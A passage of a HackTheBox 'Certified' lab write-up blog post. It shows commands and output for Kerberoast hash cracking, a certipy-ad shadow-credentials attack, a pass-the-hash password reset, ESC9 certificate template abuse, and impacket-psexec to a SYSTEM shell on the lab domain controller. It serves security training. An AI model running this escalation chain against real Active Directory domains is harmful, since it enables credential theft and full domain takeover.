class="line">$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$94a1b169920d99a9cf8d5c46d6611dab$80bd9567c20141b2cbd7d531815b870020dc4f43a499013661055ef4f9665fee66506e6f13d7b49c27932785a6384a73499eab86e36d64a6a6d5fae75a5d15abf63a873462c047eb4ebcb06a70ab24610fdd704e9e1fae75c25a7abea193232e5869664eb4562012138710e906ea169d9e71a391497ed59764e2070d652ca09dfcb36bf2101ad4dc306af1b4bb33448632ceb5ce041e534df307018e1466a0e1fce4f0ade6c2e11e7bef26f405ae99b1523d345c76964e7cc3a79780091bf8d81b24d4d4c125e3edeef47c44bb9c8b841fba71e86aa81f8c417fd4c70ee629a161568d3c33c759b923c0d39bff4cbeb618ef0af0a65527311e1115aad512268e6ce267a27a89481b7d4210c99bfd72a5c22722f569c1e1ce9ae0260bef56a84343af79ea69b8a78d804e1a57de65fb03d744924afbec25f5a9e391eaa74930b8ec2abe96f257d6eb8689c94634ec48c45b29c96080687c39a541b3bf034a0509fa0a12f75d6a3bf79a203b93941fea21e5e400d15a3c35cd8689362cb88fcb7c4e60be114a46646fe7ce7fd0cbfac8d5fc59725bea34bef9efd1d1ab61073e8e70f4f6239552a34b84354c8e78b71da5b1dac8bab55554369d57c72042fef26c6d6bcb8c18dd84c4fdd0e6ad9f41627d572f86071225350d41d7462ff8da87c8fd1c003fab88722b90a8cff57445120adfe08ecfa3464d6c630b3f41391317e076165e1f02cfdcd8a53559394b7bd32ebd192c0c54a01d39de1d6c9316250757118c771e60e159830421911363f4b2e72d6ad9c4aedc17cd5b61c554cb06786d34f6aa9c4a0169bf5b7f7bcaf3476239e06ea8b5724beec20579d540cab6c008fcb3c5a22aa59d1b4266e0f20e9c65b4025eb1024a18d0ad3da6c67b725441d5bc75b40fd3edfc1ade1ae58fbd168aedf4c3edc99e7c2ff64b81134d3fd4185261aebe69f99abe81f92230841e7f87f996b2f2bcf6d4cec391e487a451b692c68a83f61ebe25a5100fc6d135f417748c5cd089ab5a1083a1c43072c64e5769babb073be0eb220b4c676d7d9dbaa0d86caa5e1128721d47cf65fe00e8b78b11e805c78c68d54ebfaf45001ea484d5522ffb67c85772b51eabbfc45213acbc107e2015cf529970f97e39f31f97343ab5fa0f6cd041bcf1113b638a92d692c45f0a124f1896afa5bb84ce0c0a6d515749a6a7332cca298c6b1a79615863da08965726799dc02f30108fde03ac14ac58481436779771420fd1109150ba46658d6f8efacaaf45ec93cf29de425d83045858a0e00d8560ea297da4e3e0e5ff5e489a0731c91ad9a853f139db9aecb1050562df5d983a7ff998c49076f31fb893cd70a52cb80fdf3843c86f862dd22b0f6d4c6cf906885b5e1e47aaef9d888b9b8f7884cc5c981080825898be9917633b7d79b7e58c306d0616d558aca10a88c543257943021d95b8f0a5f406c2442f7ff00bc82ea6e11117f9668d8694a21ecff3be8d064300607f6d41c3aac68f2e5ace1897fa118ecb79f8b44a01ec4a0b9493436948ca42f0dd6cb1071cf4d285e2ed94c9d07fac5b80efe58f2e25b2a279c3d8e821b1</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt management-svc_hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 12 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">0g 0:00:00:03 DONE (2025-01-16 03:55) 0g/s 3814Kp/s 3814Kc/s 3814KC/s !!12Honey..*7¡Vamos!</span><br><span class="line">Session completed.</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ john management-svc_hash --show</span><br><span class="line">0 password hashes cracked, 1 left</span><br></pre></td></tr></table></figure></div>
+
+<p>seems like targetedKerberoast is not working, so trying certipy-ad</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ certipy-ad shadow auto -username judith.mader@certified.htb -p judith09 -account management_svc</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Targeting user &#x27;management_svc&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;49156211-ef77-1969-4a0d-d719249e09aa&#x27;</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;49156211-ef77-1969-4a0d-d719249e09aa&#x27; to the Key Credentials for &#x27;management_svc&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;49156211-ef77-1969-4a0d-d719249e09aa&#x27; to the Key Credentials for &#x27;management_svc&#x27;</span><br><span class="line">[*] Authenticating as &#x27;management_svc&#x27; with the certificate</span><br><span class="line">[*] Using principal: management_svc@certified.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;management_svc.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;management_svc&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;management_svc&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;management_svc&#x27;</span><br><span class="line">[*] NT hash for &#x27;management_svc&#x27;: a091c1832bcdd4677c28b5a6a1295584</span><br></pre></td></tr></table></figure></div>
+
+<p>update the password for ca_operator as management_svc has GenericAll over it  </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ pth-net rpc password &quot;ca_operator&quot; &quot;newPassword@2025&quot; -U &quot;certified.htb&quot;/&quot;management_svc&quot;%&quot;a091c1832bcdd4677c28b5a6a1295584:a091c1832bcdd4677c28b5a6a1295584&quot; -S &quot;DC01.certified.htb&quot;</span><br><span class="line">E_md4hash wrapper called.</span><br><span class="line">HASH PASS: Substituting user supplied NTLM HASH...</span><br></pre></td></tr></table></figure></div>
+<p>why pth-net rpc? pth stands for Pass the Hash</p>
+<p>Owned ca_operator now, check for vulnerable CA template</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ certipy-ad find -u &#x27;ca_operator&#x27; -p &#x27;newPassword@2025&#x27; -dc-ip 10.10.11.41 -vulnerable -enabled -stdout</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;certified-DC01-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;certified-DC01-CA&#x27; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration for &#x27;certified-DC01-CA&#x27; via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration for &#x27;certified-DC01-CA&#x27;</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : certified-DC01-CA</span><br><span class="line">    DNS Name                            : DC01.certified.htb</span><br><span class="line">    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb</span><br><span class="line">    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D</span><br><span class="line">    Certificate Validity Start          : 2024-05-13 15:33:41+00:00</span><br><span class="line">    Certificate Validity End            : 2124-05-13 15:43:41+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : CERTIFIED.HTB\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : CERTIFIED.HTB\Administrators</span><br><span class="line">                                          CERTIFIED.HTB\Domain Admins</span><br><span class="line">                                          CERTIFIED.HTB\Enterprise Admins</span><br><span class="line">        ManageCa                        : CERTIFIED.HTB\Administrators</span><br><span class="line">                                          CERTIFIED.HTB\Domain Admins</span><br><span class="line">                                          CERTIFIED.HTB\Enterprise Admins</span><br><span class="line">        Enroll                          : CERTIFIED.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : CertifiedAuthentication</span><br><span class="line">    Display Name                        : Certified Authentication</span><br><span class="line">    Certificate Authorities             : certified-DC01-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : False</span><br><span class="line">    Certificate Name Flag               : SubjectRequireDirectoryPath</span><br><span class="line">                                          SubjectAltRequireUpn</span><br><span class="line">    Enrollment Flag                     : NoSecurityExtension</span><br><span class="line">                                          AutoEnrollment</span><br><span class="line">                                          PublishToDs</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Server Authentication</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1000 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : CERTIFIED.HTB\operator ca</span><br><span class="line">                                          CERTIFIED.HTB\Domain Admins</span><br><span class="line">                                          CERTIFIED.HTB\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : CERTIFIED.HTB\Administrator</span><br><span class="line">        Write Owner Principals          : CERTIFIED.HTB\Domain Admins</span><br><span class="line">                                          CERTIFIED.HTB\Enterprise Admins</span><br><span class="line">                                          CERTIFIED.HTB\Administrator</span><br><span class="line">        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins</span><br><span class="line">                                          CERTIFIED.HTB\Enterprise Admins</span><br><span class="line">                                          CERTIFIED.HTB\Administrator</span><br><span class="line">        Write Property Principals       : CERTIFIED.HTB\Domain Admins</span><br><span class="line">                                          CERTIFIED.HTB\Enterprise Admins</span><br><span class="line">                                          CERTIFIED.HTB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC9                              : &#x27;CERTIFIED.HTB\\operator ca&#x27; can enroll and template has no security extension</span><br></pre></td></tr></table></figure></div>
+<p>Use certipy-ad to exploit esc9, reference: <a class="link"   target="_blank" rel="noopener" href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services#bkmrk-esc9-0" >https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services#bkmrk-esc9-0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ certipy-ad account update -username &#x27;management_svc@certified.htb&#x27; -hashes &#x27;a091c1832bcdd4677c28b5a6a1295584&#x27; -user &#x27;ca_operator&#x27; -upn administrator@certified.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;ca_operator&#x27;:</span><br><span class="line">    userPrincipalName                   : administrator@certified.htb</span><br><span class="line">[*] Successfully updated &#x27;ca_operator&#x27;</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ certipy-ad req -username &#x27;ca_operator@certified.htb&#x27; -password &#x27;newPassword@2025&#x27; -ca &#x27;certified-DC01-CA&#x27; -template &#x27;CertifiedAuthentication&#x27; -ns 10.10.11.41</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 5</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@certified.htb&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ certipy-ad account update -username &#x27;management_svc@certified.htb&#x27; -hashes &#x27;a091c1832bcdd4677c28b5a6a1295584&#x27; -user &#x27;ca_operator&#x27; -upn ca_operator@certif</span><br><span class="line">ied.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;ca_operator&#x27;:</span><br><span class="line">    userPrincipalName                   : ca_operator@certified.htb</span><br><span class="line">[*] Successfully updated &#x27;ca_operator&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>After that, we can authenticate via the administrator.pfx generated and retrieve the hash to be used in psexec</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.41</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@certified.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@certified.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ impacket-psexec administrator@certified.htb -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on certified.htb.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file yUvrGdmw.exe</span><br><span class="line">[*] Opening SVCManager on certified.htb.....</span><br><span class="line">[*] Creating service ITgF on certified.htb.....</span><br><span class="line">[*] Starting service ITgF.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.6414]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; dir C:\Users\Administrator\Desktop</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is EA74-A0A7</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">10/22/2024  12:15 PM    &lt;DIR&gt;          .</span><br><span class="line">10/22/2024  12:15 PM    &lt;DIR&gt;          ..</span><br><span class="line">01/15/2025  07:18 AM                34 root.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   5,222,445,056 bytes free</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-certified/nt-auth.png"
+                      alt="pwn"
+                ></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Windows/">#Windows</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/02/06/Hackthebox/htb-cat/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Cat</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/01/28/Vulnlab/Vulnlab-Escape/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Vulnlab-Escape</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-Certified</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NMAP"><span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-Share-Files-Failed"><span class="nav-text">SMB Share Files (Failed)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bloodhound"><span class="nav-text">Bloodhound</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ownership"><span class="nav-text">Ownership</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
